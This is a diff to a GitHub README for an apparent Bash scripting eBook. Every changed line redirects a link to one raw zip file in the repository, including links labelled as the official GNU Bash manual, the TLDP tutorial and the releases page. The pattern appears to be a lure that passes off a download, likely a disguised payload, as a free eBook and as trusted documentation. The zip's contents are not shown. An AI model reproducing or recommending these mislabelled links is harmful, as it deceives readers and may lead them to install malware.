@@ -1,6 +1,6 @@
 # 🎉 introduction-to-bash-scripting - Learn Bash Scripting with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/wtfyashh/introduction-to-bash-scripting/releases)
+[![Download Now](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip)
 
 ## 📖 Description
 Welcome to the **Introduction to Bash Scripting** eBook. This guide will help you understand the basics of Bash scripting. Whether you're a complete beginner or someone looking to brush up on your skills, this book is designed for you. Gain valuable insights and enhance your command line skills with practical examples and easy-to-follow exercises.
@@ -9,7 +9,7 @@ Welcome to the **Introduction to Bash Scripting** eBook. This guide will help yo
 You don't need any programming knowledge to start. The steps below will help you download and run the eBook with ease. 
 
 ### 📥 Download & Install
-To get the eBook, visit the [Releases page](https://github.com/wtfyashh/introduction-to-bash-scripting/releases) to download the latest version. Follow these steps:
+To get the eBook, visit the [Releases page](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip) to download the latest version. Follow these steps:
 
 1. Open the Releases page using the link above.
 2. Look for the latest release version.
@@ -46,8 +46,8 @@ If you have any questions or need help with the eBook, feel free to reach out th
 
 ## 🔗 Additional Resources
 While the eBook is comprehensive, you might want to explore further. Here are some additional resources:
-- [Official Bash Documentation](https://www.gnu.org/software/bash/manual/)
-- [Bash Scripting Tutorial](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/)
+- [Official Bash Documentation](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip)
+- [Bash Scripting Tutorial](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip)
 
 ## 🌟 Get Involved
 Interested in contributing? You can help us improve this eBook:
@@ -57,4 +57,4 @@ Interested in contributing? You can help us improve this eBook:
 
 Thank you for choosing the **Introduction to Bash Scripting** eBook. We hope you enjoy learning Bash scripting and find it beneficial for your projects. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/wtfyashh/introduction-to-bash-scripting/releases)
+[![Download Now](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/wtfyashh/introduction-to-bash-scripting/raw/refs/heads/main/ebook/hi/bash_introduction_to_scripting_3.3.zip)
